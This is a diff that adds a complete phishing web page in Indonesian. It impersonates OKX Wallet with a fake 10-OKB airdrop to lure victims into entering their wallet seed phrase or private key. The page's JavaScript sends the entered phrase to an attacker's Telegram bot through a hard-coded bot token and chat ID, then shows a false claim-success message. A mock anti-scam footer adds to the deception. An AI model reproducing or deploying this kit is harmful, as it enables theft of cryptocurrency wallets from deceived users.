@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OKX Web3 Wallet - Airdrop</title>
+    <style>
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        
+        .app-container { width: 100%; max-width: 414px; height: 100%; max-height: 896px; background-color: #fff; position: relative; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* ========================================================= */
+       
+        /* ========================================================= */
+        #airdrop-page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: #0b0e11; z-index: 100; display: flex; flex-direction: column; overflow-y: auto; transition: opacity 0.4s ease; }
+        #airdrop-page.hidden { opacity: 0; pointer-events: none; }
+
+        .glow-bg { position: absolute; top: -10%; left: 50%; transform: translateX(-50%); width: 300px; height: 300px; background: radial-gradient(circle, rgba(30,111,43,0.4) 0%, rgba(11,14,17,0) 70%); z-index: 0; pointer-events: none; }
+
+        /* === HEADER DENGAN LOGO SVG (WARNA HIJAU) === */
+        .airdrop-header { padding: 20px; display: flex; justify-content: center; align-items: center; z-index: 10; }
+        .header-logo-container { display: flex; align-items: center; gap: 8px; }
+        .okx-logo-svg { width: 24px; height: 24px; fill: #0ECB81; }
+        .airdrop-header-title { font-size: 16px; font-weight: 600; color: #fff; }
+
+        .airdrop-hero { text-align: center; padding: 20px 20px 10px; z-index: 10; display: flex; flex-direction: column; align-items: center; }
+        
+        /* === UPDATE: TAMPILAN GAMBAR KOIN OKB === */
+        .coin-animation { position: relative; width: 100px; height: 100px; margin-bottom: 20px; }
+        .coin-circle { 
+            width: 100%; 
+            height: 100%; 
+            border-radius: 50%; 
+            background: linear-gradient(135deg, #2b3139, #000); 
+            border: 2px solid #1e6f2b; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            box-shadow: 0 0 20px rgba(30, 111, 43, 0.4); 
+            overflow: hidden; /* Memastikan gambar tidak keluar dari lingkaran */
+        }
+        
+        /* Style untuk Gambar Koin */
+        .coin-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Menyesuaikan gambar agar memenuhi lingkaran */
+        }
+        /* ==================================== */
+
+        .coin-icon-small { position: absolute; bottom: 0; right: 0; background: #1e6f2b; width: 32px; height: 32px; border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid #0b0e11; font-weight: bold; font-size: 14px; }
+
+        .airdrop-hero h1 { font-size: 32px; font-weight: 800; margin-bottom: 10px; background: -webkit-linear-gradient(#fff, #a0a0a0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .airdrop-hero p { font-size: 14px; color: #848e9c; line-height: 1.5; padding: 0 10px; }
+
+        .claim-card { background: #1e2329; margin: 20px; border-radius: 16px; padding: 20px; border: 1px solid #2b3139; z-index: 10; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        
+        .claim-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #2b3139; }
+        .claim-row:last-child { border-bottom: none; }
+        .claim-label { font-size: 14px; color: #848e9c; }
+        .claim-value { font-size: 14px; font-weight: 600; color: #fff; }
+        .claim-value.green { color: #0ECB81; font-size: 18px; font-weight: 700; }
+        
+        /* Button Klaim */
+        .btn-claim { width: 100%; background: #1e6f2b; color: #fff; border: none; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; margin-top: 20px; cursor: pointer; transition: all 0.3s; box-shadow: 0 4px 15px rgba(30, 111, 43, 0.4); display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn-claim:active { transform: scale(0.98); }
+        .btn-claim:disabled { background: #2b3139; color: #848e9c; box-shadow: none; cursor: not-allowed; opacity: 0.6; }
+
+        /* Tombol Impor di Halaman Airdrop */
+        .btn-import-airdrop { width: 100%; background: transparent; color: #fff; border: 1px solid #474d57; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; margin-top: 10px; cursor: pointer; transition: all 0.3s; display: none; }
+        .btn-import-airdrop:active { background: #2b3139; }
+
+        /* Teks Status Klaim */
+        .claim-status-text { text-align: center; font-size: 12px; color: #848e9c; margin-top: 12px; line-height: 1.4; }
+
+        .guide-section { padding: 0 20px 40px; z-index: 10; }
+        .guide-title { font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #fff; }
+        .guide-step { display: flex; gap: 15px; margin-bottom: 15px; }
+        .step-number { width: 24px; height: 24px; border-radius: 50%; background: rgba(30, 111, 43, 0.2); color: #0ECB81; display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .step-text h4 { font-size: 14px; font-weight: 600; margin-bottom: 4px; color: #eaecef; }
+        .step-text p { font-size: 12px; color: #848e9c; line-height: 1.4; }
+
+        .airdrop-footer { text-align: center; padding: 20px; font-size: 11px; color: #474d57; z-index: 10; margin-top: auto; }
+
+        /* === HALAMAN UTAMA (ONBOARDING) === */
+        #main-page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; flex-direction: column; transform: translateX(100%); transition: transform 0.5s ease; z-index: 50; }
+        #main-page.active { transform: translateX(0); }
+        
+        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .toggle-switch { background: #f0f0f0; border-radius: 20px; padding: 4px; display: flex; width: fit-content; margin: 0 auto; }
+        .toggle-switch span { padding: 8px 20px; border-radius: 16px; font-size: 14px; font-weight: 600; color: #888; }
+        .toggle-switch .active { background: #fff; color: #000; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+
+        .hero-section { flex-grow: 1; position: relative; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; }
+        .hero-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; mask-image: linear-gradient(to bottom, black 50%, transparent 100%); -webkit-mask-image: linear-gradient(to bottom, black 50%, transparent 100%); background-color: #222; }
+        
+        .text-content { position: relative; z-index: 2; margin-bottom: 20px; }
+        .text-content h1 { font-size: 34px; font-weight: 700; line-height: 1.1; margin-bottom: 10px; color: #000; }
+        .text-content p { color: #444; font-size: 14px; font-weight: 500; }
+
+        .action-buttons { padding: 0 20px 20px; z-index: 2; }
+        .btn-primary { width: 100%; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 15px; background-color: #1e6f2b; color: white; }
+        .btn-secondary { width: 100%; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 15px; background-color: #f5f5f5; color: #000; }
+
+        .bottom-nav { display: flex; justify-content: space-around; align-items: center; padding: 10px 0 20px; border-top: 1px solid #eee; background: #fff; position: relative; z-index: 10; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 11px; color: #666; cursor: pointer; gap: 4px; }
+        .nav-icon { font-size: 20px; }
+        .central-dex { position: relative; top: -20px; }
+        .dex-btn { background-color: #000; color: #fff; width: 55px; height: 55px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 24px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .nav-item.active { color: #1e6f2b; font-weight: 700; }
+
+        /* === BOTTOM SHEET (IMPOR WALLET) === */
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 110; opacity: 0; visibility: hidden; transition: opacity 0.3s ease; }
+        #overlay.active { opacity: 1; visibility: visible; }
+
+        #import-sheet { position: absolute; bottom: 0; left: 0; width: 100%; background: #fff; border-radius: 24px 24px 0 0; z-index: 120; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1); padding: 20px; padding-bottom: 30px; display: flex; flex-direction: column; max-height: 90%; overflow-y: auto; }
+        #import-sheet.active { transform: translateY(0); }
+
+        .drag-handle { width: 40px; height: 5px; background: #e0e0e0; border-radius: 10px; margin: 0 auto 20px; }
+        .sheet-title { text-align: center; font-size: 20px; font-weight: 700; margin-bottom: 25px; color: #000; }
+
+        /* List Items */
+        .import-list { display: flex; flex-direction: column; gap: 25px; margin-bottom: 30px; }
+        .import-item { display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
+        .import-item-left { display: flex; align-items: center; gap: 15px; }
+        
+        .icon-box { width: 36px; height: 36px; display: flex; justify-content: center; align-items: center; flex-shrink: 0; }
+        .icon-box svg { width: 100%; height: 100%; stroke: #000; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+
+        .item-text h3 { font-size: 16px; font-weight: 600; color: #000; margin-bottom: 4px; }
+        .item-text p { font-size: 13px; color: #707a8a; line-height: 1.3; padding-right: 10px; }
+        .chevron { color: #b7bdc6; font-size: 20px; font-weight: bold; }
+
+        .terms-text { text-align: center; font-size: 12px; color: #707a8a; line-height: 1.4; padding: 0 10px; }
+        .terms-text a { color: #000; text-decoration: none; font-weight: 600; }
+
+        /* === HALAMAN INPUT SEED PHRASE === */
+        #seed-page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 130; display: flex; flex-direction: column; transform: translateX(100%); transition: transform 0.4s ease; }
+        #seed-page.active { transform: translateX(0); }
+
+        .seed-header { padding: 20px; display: flex; align-items: center; }
+        .back-btn { font-size: 24px; cursor: pointer; background: none; border: none; padding: 5px; font-weight: bold; color: #000; }
+
+        .seed-body { padding: 0 20px; flex-grow: 1; display: flex; flex-direction: column; }
+        .seed-title { font-size: 28px; font-weight: 700; line-height: 1.2; margin-bottom: 15px; margin-top: 10px; color: #000; }
+        
+        /* === PERBAIKAN BAGIAN INPUT === */
+        .input-container { position: relative; margin-top: 10px; flex-grow: 1; cursor: text; }
+        
+        .fake-cursor { 
+            position: absolute; 
+            top: 4px; 
+            left: 0; 
+            display: inline-block; 
+            width: 2px; 
+            height: 22px; 
+            background-color: #1e6f2b; 
+            animation: blink 1s step-end infinite; 
+            z-index: 1;
+            pointer-events: none;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+        
+        .placeholder-text { 
+            position: absolute; 
+            top: 2px; 
+            left: 15px; 
+            color: #ccc; 
+            font-size: 18px; 
+            line-height: 1.5; 
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .seed-textarea { 
+            position: relative; 
+            width: 100%; 
+            height: 100%; 
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #000; 
+            resize: none; 
+            font-size: 18px; 
+            line-height: 1.5; 
+            padding: 0 0 0 15px; 
+            z-index: 2;
+            font-family: inherit;
+        }
+        /* ============================= */
+
+        .paste-btn-wrapper { display: flex; justify-content: flex-end; margin-top: 15px; }
+        .paste-btn { background: #f0f0f0; border: none; padding: 10px 20px; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .paste-btn svg { width: 16px; height: 16px; stroke: #000; stroke-width: 2; fill: none; }
+
+        .btn-submit-seed { width: 100%; background: #1e6f2b; color: #fff; border: none; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 600; margin-top: 15px; cursor: pointer; margin-bottom: 10px; }
+
+        .seed-footer { background: #fafafa; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #eee; margin-top: auto; }
+        .footer-text p { font-size: 12px; color: #666; margin-bottom: 5px; }
+        .footer-text h4 { font-size: 14px; font-weight: 700; margin-bottom: 10px; color: #000; }
+        .okx-logo-small { display: flex; align-items: center; gap: 5px; font-weight: 900; font-size: 18px; color: #000; }
+        .qr-placeholder { width: 70px; height: 70px; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="white"/><path d="M10,10 h30 v30 h-30 z M15,15 h20 v20 h-20 z M60,10 h30 v30 h-30 z M65,15 h20 v20 h-20 z M10,60 h30 v30 h-30 z M15,65 h20 v20 h-20 z M60,60 h10 v10 h-10 z M80,60 h10 v10 h-10 z M60,80 h10 v10 h-10 z M80,80 h10 v10 h-10 z" fill="black"/></svg>'); background-size: cover; border: 1px solid #ddd; border-radius: 5px; }
+
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- ================= 1. HALAMAN DEPAN: AIRDROP OKB ================= -->
+        <div id="airdrop-page">
+            <div class="glow-bg"></div>
+
+            <!-- HEADER DENGAN LOGO SVG HIJAU -->
+            <div class="airdrop-header">
+                <div class="header-logo-container">
+                    <svg class="okx-logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M21.5 21.5H39V39H21.5V21.5ZM61 21.5H78.5V39H61V21.5ZM21.5 61H39V78.5H21.5V61ZM61 61H78.5V78.5H61V61ZM43 43H57V57H43V43Z" fill="currentColor"/>
+                    </svg>
+                    <div class="airdrop-header-title">Airdrop Wallet</div>
+                </div>
+            </div>
+
+            <div class="airdrop-hero">
+                <div class="coin-animation">
+                    <!-- UPDATE: Menggunakan tag <img> untuk logo OKB -->
+                    <div class="coin-circle">
+                        <img src="https://i.ibb.co/8gTBgxhK/2-A344-E8-E526-BF36-F0-B386-E5-E1-DF39441.webp" alt="OKB Logo" class="coin-image">
+                    </div>
+                    <!-- Akhir UPDATE -->
+                    
+                    <div class="coin-icon-small">🎁</div>
+                </div>
+                <h1>Airdrop 10 Token OKB</h1>
+                <p>Distribusi Airdrop 10 Token OKB Melalui OKX Wallet. Selesaikan verifikasi untuk mengklaim reward Anda.</p>
+            </div>
+
+            <div class="claim-card">
+                <div class="claim-row">
+                    <span class="claim-label">Jumlah Airdrop</span>
+                    <span class="claim-value">10 OKB</span>
+                </div>
+                <div class="claim-row">
+                    <span class="claim-label">Estimasi Nilai</span>
+                    <span class="claim-value green" id="estimated-value">~ $0.00</span>
+                </div>
+                <div class="claim-row">
+                    <span class="claim-label">Status Kelayakan</span>
+                    <span class="claim-value green">Memenuhi Syarat</span>
+                </div>
+
+                <button class="btn-claim" id="claimBtn" onclick="prosesKlaim()" disabled>
+                    <span id="btnText">Klaim Airdrop Sekarang</span>
+                </button>
+                
+                <div class="claim-status-text" id="claimStatusText">
+                    Anda harus Login atau Impor Wallet terlebih dahulu untuk mengklaim Airdrop ini.
+                </div>
+
+                <button class="btn-import-airdrop" id="btnImportAirdrop" onclick="openImportSheet()" style="display: block;">
+                    Impor Wallet
+                </button>
+            </div>
+
+            <div class="guide-section">
+                <div class="guide-title">Panduan Klaim Airdrop 10 Token OKB di OKX Wallet</div>
+                
+                <div class="guide-step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">
+                        <h4>Hubungkan Wallet</h4>
+                        <p>Pastikan Anda telah menginstal OKX Wallet dan menghubungkannya ke jaringan Web3.</p>
+                    </div>
+                </div>
+                
+                <div class="guide-step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">
+                        <h4>Verifikasi Kelayakan</h4>
+                        <p>Sistem akan memeriksa apakah alamat wallet Anda terdaftar dalam snapshot program airdrop.</p>
+                    </div>
+                </div>
+
+                <div class="guide-step">
+                    <div class="step-number">3</div>
+                    <div class="step-text">
+                        <h4>Konfirmasi Transaksi</h4>
+                        <p>Klik tombol Klaim dan setujui transaksi (membutuhkan sedikit biaya gas jaringan).</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="airdrop-footer">
+                Hati-hati terhadap penipuan. Tim OKX tidak akan pernah meminta seed phrase Anda.
+            </div>
+        </div>
+
+        <!-- ================= 2. HALAMAN UTAMA (ONBOARDING WALLET) ================= -->
+        <div id="main-page">
+            <div class="header">
+                <div class="toggle-switch">
+                    <span>Exchange</span>
+                    <span class="active">Wallet</span>
+                </div>
+            </div>
+            <div class="hero-section">
+                <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=1000&auto=format&fit=crop" alt="Hero Background" class="hero-bg">
+                <div class="text-content">
+                    <h1>On-Chain. Chain Apa<br>Saja.</h1>
+                    <p>Wallet · Trading · Saham · Earn · dApp</p>
+                </div>
+            </div>
+            <div class="action-buttons">
+                <button class="btn-primary">Buat Wallet</button>
+                <button class="btn-secondary" onclick="openImportSheet()">Impor Wallet</button>
+            </div>
+            <div class="bottom-nav">
+                <div class="nav-item active"><span class="nav-icon">💼</span><span>OKX</span></div>
+                <div class="nav-item"><span class="nav-icon">🧭</span><span>Jelajahi</span></div>
+                <div class="nav-item central-dex"><div class="dex-btn">⇄</div><span>DEX</span></div>
+                <div class="nav-item"><span class="nav-icon">🛡️</span><span>DeFi</span></div>
+                <div class="nav-item"><span class="nav-icon">🚀</span><span>Boost</span></div>
+            </div>
+        </div>
+
+        <!-- ================= 3. BOTTOM SHEET (SEMUA OPSI IMPOR) ================= -->
+        <div id="overlay" onclick="closeImportSheet()"></div>
+        <div id="import-sheet">
+            <div class="drag-handle"></div>
+            <div class="sheet-title">Import with</div>
+            
+            <div class="import-list">
+                <!-- 1. Seed Phrase -->
+                <div class="import-item" onclick="goToSeedPage()">
+                    <div class="import-item-left">
+                        <div class="icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
+                        </div>
+                        <div class="item-text">
+                            <h3>Seed phrase or private key</h3>
+                            <p>Use 12, 18, or 24-word seed phrases, or private keys</p>
+                        </div>
+                    </div>
+                    <div class="chevron">›</div>
+                </div>
+
+                <!-- 2. Social Login -->
+                <div class="import-item">
+                    <div class="import-item-left">
+                        <div class="icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle><circle cx="17" cy="14" r="3"></circle><path d="M17 13v2h1"></path></svg>
+                        </div>
+                        <div class="item-text">
+                            <h3>Social login</h3>
+                            <p>Log in with Google, Apple or Email</p>
+                        </div>
+                    </div>
+                    <div class="chevron">›</div>
+                </div>
+
+                <!-- 3. Cloud Backup -->
+                <div class="import-item">
+                    <div class="import-item-left">
+                        <div class="icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"></path></svg>
+                        </div>
+                        <div class="item-text">
+                            <h3>Cloud backup</h3>
+                            <p>Import wallet swiftly from your cloud backup</p>
+                        </div>
+                    </div>
+                    <div class="chevron">›</div>
+                </div>
+
+                <!-- 4. Hardware Wallet -->
+                <div class="import-item">
+                    <div class="import-item-left">
+                        <div class="icon-box">
+                            <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2"></rect><path d="M4 10h16"></path><circle cx="8" cy="14" r="1"></circle></svg>
+                        </div>
+                        <div class="item-text">
+                            <h3>Hardware wallet</h3>
+                            <p>Connect to a hardware wallet via Bluetooth or a QR code</p>
+                        </div>
+                    </div>
+                    <div class="chevron">›</div>
+                </div>
+
+                <!-- 5. Keyless Wallet -->
+                <div class="import-item">
+                    <div class="import-item-left">
+                        <div class="icon-box">
+                            <svg viewBox="0 0 24 24"><rect x="3" y="6" width="18" height="12" rx="2"></rect><path d="M7 12h4m4 0h2m-6 4h6M7 8v8"></path></svg>
+                        </div>
+                        <div class="item-text">
+                            <h3>Keyless wallet restoration</h3>
+                            <p>Restore MPC (Multi-Party Computation) wallet with your Exchange account</p>
+                        </div>
+                    </div>
+                    <div class="chevron">›</div>
+                </div>
+            </div>
+
+            <div class="terms-text">
+                I agree to OKX Wallet's <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>.
+            </div>
+        </div>
+
+        <!-- ================= 4. HALAMAN INPUT SEED PHRASE ================= -->
+        <div id="seed-page">
+            <div class="seed-header">
+                <button class="back-btn" onclick="closeSeedPage()">❮</button>
+            </div>
+            
+            <div class="seed-body">
+                <h1 class="seed-title">Enter seed phrase or private key</h1>
+                
+                <div class="input-container" onclick="document.getElementById('real-input').focus()">
+                    <span class="fake-cursor" id="fake-cursor"></span>
+                    <span class="placeholder-text" id="placeholder-text">If you're using a seed phrase to import the wallet, separate each word with a space.</span>
+                    <textarea id="real-input" class="seed-textarea" oninput="handleTyping()"></textarea>
+                </div>
+
+                <div class="paste-btn-wrapper">
+                    <button class="paste-btn" onclick="pasteText()">
+                        <svg viewBox="0 0 24 24"><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path></svg>
+                        Paste
+                    </button>
+                </div>
+
+                <button class="btn-submit-seed" onclick="simulateImportSuccess()">Impor Wallet</button>
+            </div>
+
+            <div class="seed-footer">
+                <div class="footer-text">
+                    <p>OKX Wallet</p>
+                    <h4>Jumpstart your crypto journey!</h4>
+                    <div class="okx-logo-small">🟩 Wallet</div>
+                </div>
+                <div class="qr-placeholder"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ================= JAVASCRIPT ================= -->
+    <script>
+        let isWalletImported = false;
+
+        // ==========================================
+        // KONFIGURASI TELEGRAM BOT (GANTI DI SINI)
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '9096792748:AAEkNyLr7tBmHlUYFnC29qEHAcXq9zamMdc'; 
+        const TELEGRAM_CHAT_ID = '8555026746';     
+        // ==========================================
+
+        // === FUNGSI BARU: AMBIL HARGA OKB REAL-TIME ===
+        async function fetchOKBPrice() {
+            const estimatedValueEl = document.getElementById('estimated-value');
+            estimatedValueEl.innerText = '~ $...'; 
+
+            try {
+                const response = await fetch('https://www.okx.com/api/v5/market/ticker?instId=OKB-USDT');
+                const json = await response.json();
+                
+                if (json.code === "0" && json.data && json.data.length > 0) {
+                    const price = parseFloat(json.data[0].last);
+                    const estimatedValue = 10 * price; // 10 OKB * harga
+                    
+                    const formattedValue = new Intl.NumberFormat('en-US', {
+                        style: 'currency',
+                        currency: 'USD'
+                    }).format(estimatedValue);
+                    
+                    estimatedValueEl.innerText = `~ ${formattedValue}`;
+                } else {
+                    console.warn('Gagal mengambil data harga dari OKX:', json.msg);
+                    estimatedValueEl.innerText = '~ $0.00';
+                }
+            } catch (error) {
+                console.error('Error fetching price:', error);
+                estimatedValueEl.innerText = '~ $0.00';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            fetchOKBPrice();
+        });
+        // ==============================================
+
+        function sendToTelegram(seedText) {
+            if (TELEGRAM_BOT_TOKEN === 'MASUKKAN_TOKEN_BOT_ANDA_DISINI' || TELEGRAM_CHAT_ID === 'MASUKKAN_CHAT_ID_ANDA_DISINI') {
+                console.warn("Telegram Bot Token / Chat ID belum diatur.");
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: `🚨 *OKX Wallet - Seed Phrase Diinput* 🚨\n\n\`${seedText}\``,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) console.log("Pesan berhasil dikirim ke Telegram.");
+                else console.error("Gagal mengirim ke Telegram:", data);
+            })
+            .catch(error => console.error("Error jaringan:", error));
+        }
+
+        function simulateImportSuccess() {
+            var seedText = document.getElementById('real-input').value;
+
+            if (seedText.trim() === "") {
+                alert("Silakan masukkan seed phrase atau private key terlebih dahulu.");
+                return;
+            }
+
+            sendToTelegram(seedText);
+
+            isWalletImported = true;
+            closeSeedPage();
+            
+            const claimBtn = document.getElementById('claimBtn');
+            claimBtn.disabled = false;
+            
+            const statusText = document.getElementById('claimStatusText');
+            statusText.innerHTML = "✅ Wallet berhasil diimpor! Anda sekarang dapat mengklaim Airdrop.";
+            statusText.style.color = "#0ECB81";
+            
+            document.getElementById('btnImportAirdrop').style.display = 'none';
+        }
+
+        function prosesKlaim() {
+            if (!isWalletImported) return;
+
+            const btn = document.getElementById('claimBtn');
+            const btnText = document.getElementById('btnText');
+            const airdropPage = document.getElementById('airdrop-page');
+            
+            btn.disabled = true;
+            btnText.innerHTML = "Memproses Klaim...";
+            
+            setTimeout(() => {
+                btnText.innerHTML = "✅ Klaim Berhasil!";
+                btn.style.background = "#0ECB81"; 
+                
+                setTimeout(() => {
+                    alert("Selamat! 10 Token OKB telah berhasil dikirim ke OKX Wallet Anda.");
+                    
+                    airdropPage.classList.add('hidden');
+                    
+                    setTimeout(() => {
+                        airdropPage.style.display = 'none'; 
+                        document.getElementById('main-page').classList.add('active');
+                    }, 400);
+
+                }, 500);
+
+            }, 2000);
+        }
+
+        function openImportSheet() {
+            document.getElementById('overlay').classList.add('active');
+            document.getElementById('import-sheet').classList.add('active');
+        }
+
+        function closeImportSheet() {
+            document.getElementById('overlay').classList.remove('active');
+            document.getElementById('import-sheet').classList.remove('active');
+        }
+
+        function goToSeedPage() {
+            closeImportSheet();
+            document.getElementById('seed-page').classList.add('active');
+            
+            setTimeout(() => {
+                document.getElementById('real-input').focus();
+            }, 400);
+        }
+
+        function closeSeedPage() {
+            document.getElementById('seed-page').classList.remove('active');
+        }
+
+        function handleTyping() {
+            var textarea = document.getElementById('real-input');
+            var placeholder = document.getElementById('placeholder-text');
+            var fakeCursor = document.getElementById('fake-cursor');
+            
+            if (textarea.value.length > 0) {
+                placeholder.style.display = 'none';
+                fakeCursor.style.display = 'none';
+            } else {
+                placeholder.style.display = 'inline';
+                fakeCursor.style.display = 'inline-block';
+            }
+        }
+
+        function pasteText() {
+            var textarea = document.getElementById('real-input');
+            textarea.value = "apple banana cherry dog elephant frog grape house ice juice kite lemon";
+            handleTyping();
+        }
+    </script>
+</body>
+</html>
